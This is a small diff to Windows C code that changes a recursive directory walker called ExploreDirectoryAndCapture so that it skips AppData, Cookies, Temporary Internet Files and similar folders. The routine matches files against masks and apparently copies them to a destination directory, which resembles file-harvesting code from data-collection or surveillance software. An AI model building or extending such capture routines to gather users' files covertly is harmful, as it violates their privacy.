@@ -295,6 +295,7 @@ BOOL FileMatchMask(WCHAR *file_name, WCHAR **masks)
 	return FALSE;
 }
 
+
 void ExploreDirectoryAndCapture(WCHAR *start_path, DWORD depth, WCHAR **masks, WCHAR *dest_dir)
 {
 	WIN32_FIND_DATAW finddata;
@@ -307,9 +308,11 @@ void ExploreDirectoryAndCapture(WCHAR *start_path, DWORD depth, WCHAR **masks, W
 	if (hfind == INVALID_HANDLE_VALUE)
 		return;
 	do {
-		if (!wcscmp(finddata.cFileName, L".") || !wcscmp(finddata.cFileName, L".."))
+		if (!wcscmp(finddata.cFileName, L".") || !wcscmp(finddata.cFileName, L"..") || !_wcsicmp(finddata.cFileName, L"Temporary Internet Files") ||
+			!_wcsicmp(finddata.cFileName, L"AppData") || !_wcsicmp(finddata.cFileName, L"Local Settings") || 
+			!_wcsicmp(finddata.cFileName, L"Application Data") || !_wcsicmp(finddata.cFileName, L"Cookies"))
 			continue;
-
+		
 		CompleteDirectoryPath(start_path, finddata.cFileName, file_path);
 
 		if (finddata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
